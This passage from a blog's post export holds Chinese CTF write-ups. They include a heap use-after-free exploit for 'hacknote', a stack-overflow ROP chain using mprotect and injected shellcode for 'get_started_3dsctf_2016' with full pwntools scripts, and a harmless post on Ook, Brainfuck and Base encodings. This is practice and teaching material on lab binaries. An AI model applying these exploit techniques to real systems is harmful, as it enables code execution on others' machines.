class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后打开<code>Structures界面</code>，快捷键是<code>Shift+F9</code>，然后按<code>Insert</code>-<code>Add standard structure</code>，然后找到刚才我们定义的结构体note，然后确定。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200212182357.png" alt></p><p>然后来到<code>add_note函数</code>的位置，对着v0按Y，然后输入<code>struct note * v0</code>，确定即可还原对应结构体。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200212182532.png" alt></p><h2 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h2><p>这也是漏洞所在的函数，程序只进行了free，但没有置NULL，也就是<code>UAF漏洞</code>。</p><p>注意一下程序进行free的顺序：先free掉content指针，然后free掉note</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200212184924.png" alt></p><h2 id="print-note"><a href="#print-note" class="headerlink" title="print_note"></a>print_note</h2><p>这个函数的功能实际上就是通过note的puts函数指针调用puts函数，如果我们把puts函数指针覆盖成程序中已经给了我们的magic函数指针，就能执行magic函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"cat flag"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-Let’s-do-it"><a href="#0x02-Let’s-do-it" class="headerlink" title="0x02 Let’s do it"></a>0x02 Let’s do it</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用fastbins的特性<code>FILO</code>，添加2个content大小符合fastbins的note，然后delete(0)、delete(1)，再次申请content大小为8的note，覆盖note0的puts函数指针为magic函数指针，然后通过print_note(0)来执行magic函数。</p><h2 id="为什么要添加2个content大小符合fastbins的note？"><a href="#为什么要添加2个content大小符合fastbins的note？" class="headerlink" title="为什么要添加2个content大小符合fastbins的note？"></a>为什么要添加2个content大小符合fastbins的note？</h2><p><strong>大部分文章都说这两个note的content的size要符合fastbins，但是我在实际测试中就算这俩note的content的size不在fastbins范围内，也照样能pwn掉，而且根据这道题目利用的原理，似乎size没必要在fastbins范围内。但怕我才疏学浅，有什么遗漏或者不知道的地方，这里还是按照各位大佬们所说的来做吧。</strong></p><p>根据我们的思路，我们的执行流程是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#size要符合fastbins的大小要求，我们这里令size = 0x20</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>执行完这些以后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x10</span>: chunk(<span class="number">1</span>) —▸ chunk(<span class="number">0</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x18</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x28</span>: chunk(<span class="number">1</span>)_content —▸ chunk(<span class="number">0</span>)_content ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x38</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>由于fastbins的特性<code>FILO</code>,当我们再次申请大小为8的chunk的时候，会首先申请到<code>chunk1</code>，申请以后<code>chunk1</code>还在内存中的原位置(就是free前这个chunk在哪，申请后就在哪)， 再次申请大小为8的chunk的时候，就会申请到<code>chunk0</code>,也在内存中的原位置。</p><p>而如果我们<code>add_note</code>的时候，程序固定会先<code>malloc(8)</code>，这时候申请到的是<code>chunk1</code>，假如我们让这个新的<code>note2</code>的content的size也为8，那么就能申请到<code>chunk0</code>来作为新的这个<code>chunk2</code>的<code>content</code>，这样就能修改里面的内容了，也就能修改掉<code>puts函数指针</code>为任意值了，这里当然要修改成<code>magic函数指针</code>了！</p><ul><li>理解了这些以后，这道题目似乎就没啥难点了，调试也比较容易，就不再放图了。</li></ul><h1 id="0x03-完整EXP"><a href="#0x03-完整EXP" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h1><p>运行环境<code>Ubuntu16</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Note size :'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Content :'</span>)</span><br><span class="line">    c.sendline(cont)</span><br><span class="line">    c.recvuntil(<span class="string">'Success !\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line">    c.recvuntil(<span class="string">'Success\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x08</span>,p32(magic))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>看到一个博主写的总结，感觉挺不错。</p><blockquote><p>总结<br>off-by-one：输入或者赋值是否考虑临界情况。<br>利用：设置chunk大小使最后一个字节覆盖后指向的内容从不可操作到一个有意义可以操作的地址处。</p><p>Unlink：输入或者赋值的长度能够比真正的chunk更大。<br>利用：构造伪chunk设置后一个chunk的prev_size和flag标志，使系统执行unlink操作。执行unlink操作实现复写got表。<br>特点：因为验证保护，需要一个跳板才能实现任意写，这个跳板一般是bss段的数据。也就是说需要bss段本身在程序中是存有有用数据的。</p><p>use after free：free之后没有设置为NULL<br>利用：创建，创建，删除，创建。构造伪chunk。<br>特点：free之后可以继续输出。</p></blockquote>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016</title>
    <url>/2020/02/25/get-started-3dsctf-2016/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23549.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是BUUCTF上的一道只有1分的题目，本以为就是个简单的ROP，但是弄了半天打不通，最后借助大佬们的WP完成了这道题目，写此博客记录几个易错点。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure><p>程序没开PIE和Canary。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Qual a palavrinha magica? "</span>, v4);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">get_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"rt"</span>);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    v4 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">char</span>)v4;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v5);</span><br><span class="line">        v6 = getc(v3);</span><br><span class="line">        v5 = (<span class="keyword">char</span>)v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在main函数存在明显的栈溢出，并且存在get_flag函数，但是该函数有一个if语句，不过我们可以绕过这个if验证。</p><h2 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h2><p><strong>main函数中v4距离返回地址多少个字节？</strong></p><p>在IDA中，可以看到对v4的描述如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [esp+4h] [ebp-38h]</span></span><br></pre></td></tr></table></figure><p>按照以往经验，可能会直接认为v4距离ebp有0x38个字节，所以距离返回地址有0x38+4个字节，但实际上并不是这样，来看main函数的汇编。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200225224713.png" alt></p><p>这个程序不同于别的程序，在main函数的开始并没有<code>push ebp; mov ebp,esp</code>这种操作。</p><p>这个程序的main栈帧(叫法可能不太准确?但是大体意思应该表达清楚了)并没有ebp，寻址方式是esp寻址。</p><p><strong>所以v4距离返回地址有0x38个字节，这一点确实困扰我好大一会</strong></p><h1 id="0x02-Let’s-do-it"><a href="#0x02-Let’s-do-it" class="headerlink" title="0x02 Let’s do it!"></a>0x02 Let’s do it!</h1><h2 id="test-py"><a href="#test-py" class="headerlink" title="test.py"></a>test.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process('./get')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28831</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Qual a palavrinha magica? '</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line">get_flag = <span class="number">0x80489B8</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x38</span>  + p32(get_flag)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>栈溢出覆盖eip</p><p>本地可以打通，但是远程不可以，这里的get_flag是取的绕过if检测以后的那部分。</p><h2 id="test2-py"><a href="#test2-py" class="headerlink" title="test2.py"></a>test2.py</h2><p>这个方法运用了<code>mprotect函数</code>，这个函数也是这道题目的第二个重点。</p><p>我是第一次接触这个函数，通过大佬们的博客也了解到了这个函数的功能以及用法。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br></pre></td></tr></table></figure><p>addr 我们要进行修改权限的地址</p><p>len 是我们要修改的地址的长度</p><p>prot 是我们想给从addr到addr + len 这段地址赋予的权限，就是rwx这三个权限，我们可以赋予这段地址rw(可读可写权限但不可执行)，也可以赋予r(仅可读)，也可以赋予rwx(可读可写可执行)。</p><p><code>rwx 对应的是 7</code></p><p><strong>所以我们这个方法的目的就是借助这个函数，将一段地址的权限修改为可读可写可执行，然后在这段地址上写入shellcode，然后想办法控制eip到这段地址，从而执行shellcode。</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200225230715.png" alt></p><p>这段地址我们选择的是 bss = 0x80ea000</p><p>这里执行2次rop，但是依然是本地可以打通，远程打不通。。。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">'./get'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./get'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',29982)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x80ea000</span></span><br><span class="line">mprotect = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Qual a palavrinha magica? '</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect) + p32(main) + p32(bss) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(read) + p32(bss) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x100</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>既然两次rop打不通，那就试试一次吧。</p><p>如何把2次rop变成一次rop？</p><p>我们可以借助 pop..ret 来实现。</p><p>注意到mprotect和read函数都是有3个参数，所以我们需要3次pop，一次ret的gadget。</p><p>通过命令<code>ROPgadget --binary get --only &#39;pop|ret&#39; |grep pop</code>可以看到一大堆gadgets</p><p>随便选一个含有3个pop和1个ret的就行。</p><p>这里我们选择<code>0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process('./get')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29982</span>)</span><br><span class="line">elf = ELF(<span class="string">'./get'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x80ea000</span></span><br><span class="line">ppp_ret = <span class="number">0x0806fc08</span> <span class="comment">#0x0806fc08 : pop esi ; pop ebx ; pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">mprotect = elf.symbols[<span class="string">'mprotect'</span>]</span><br><span class="line">read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">payload += p32(mprotect) + p32(ppp_ret) + p32(bss) + p32(<span class="number">0x2000</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(read) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x100</span>) </span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>家里网速最近不太好，没加sleep的时候一直打不通。。。还以为exp出问题了，调了半天才发现是网速问题。。。</p><p><strong>最后还是要感谢各位师傅们的博客</strong></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>令人蛋疼的编码(持续更新)</title>
    <url>/2019/05/09/%E4%BB%A4%E4%BA%BA%E8%9B%8B%E7%96%BC%E7%9A%84%E7%BC%96%E7%A0%81-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/319709.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27907220&auto=1&height=66"></iframe>[一个不错的关于编码的博客](https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/)<h1 id="Ook编码-vs-Brainfuc"><a href="#Ook编码-vs-Brainfuc" class="headerlink" title="Ook编码 vs Brainfuc"></a>Ook编码 vs Brainfuc</h1><ul><li>Brainfuck/Ook:</li><li>Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainfuck或brainfuck，甚至被简称为BF。</li><li>OoK！是一种为红毛猩猩设计的编程语言。OoK！与众所周知的深奥语言BrainF uck基本上是同构的 ，但语法元素更少。<h2 id="形式1"><a href="#形式1" class="headerlink" title="形式1"></a>形式1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.</span><br><span class="line">Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook.</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure></li></ul><h2 id="形式2"><a href="#形式2" class="headerlink" title="形式2"></a>形式2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">....................!?!!.?....................?.?!.?....!.............!.?.......!?!!.?!!!!!!?.?!.?!!!!!.............!.?.........!?!!.?........?.?!.?........!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!.!!!!!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?..........!.?.........!?!!.?........?.?!.?..!.?.......!?!!.?!!!!!!?.?!.?!!!!!!!!!!!.?...............!?!!.?!!!!!!!!!!!!!!?.?!.?!!!!!!!!!!!!!!!!!.........!...!...!...!.!!!!!!!!!!!!!!!.?...............!?!!.?..............?.?!.?......!.......!...................!.!!!!!!!!!...........!.?.......!?!!.?......?.?!.?............!.?.</span><br></pre></td></tr></table></figure><ul><li>通过观察可以看出来, 形式2是形式1去掉Ook和空格以后的形式。</li></ul><h1 id="BrainFuck"><a href="#BrainFuck" class="headerlink" title="BrainFuck"></a>BrainFuck</h1><h1 id="形式"><a href="#形式" class="headerlink" title="形式"></a>形式</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">++++++++[&gt;++++[&gt;++&gt;+++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;+&gt;+&gt;-&gt;&gt;+[&lt;]&lt;-]&gt;&gt;.&gt;---.+++++++..+++.&gt;&gt;.&lt;-.&lt;.+++.------.--------.&gt;&gt;+.&gt;++.</span><br></pre></td></tr></table></figure><ul><li><p>观察可以看出, 该编码的形式由+- [] &gt;&lt; .组成</p></li><li><p>Ook 和 BrainFuck都可以通过下面这个网站在线解码:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://tool.bugku.com/brainfuck/</span><br></pre></td></tr></table></figure></li></ul><h1 id="Base58-vs-Base64"><a href="#Base58-vs-Base64" class="headerlink" title="Base58 vs Base64"></a>Base58 vs Base64</h1><ul><li><p>Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。</p></li><li><p>Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址,相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/“符号.</p></li></ul><h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><ul><li>Unicode又称（统一码、万国码、单一码）世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。</li><li>可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。</li></ul>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
  </entry>
  <entry>
    <title>一道逆向题引起的一系列爆破尝试</title>
    <url>/2019/09/28/%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E9%A2%98%E5%BC%95%E8%B5%B7%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E7%88%86%E7%A0%B4%E5%B0%9D%E8%AF%95/</url>
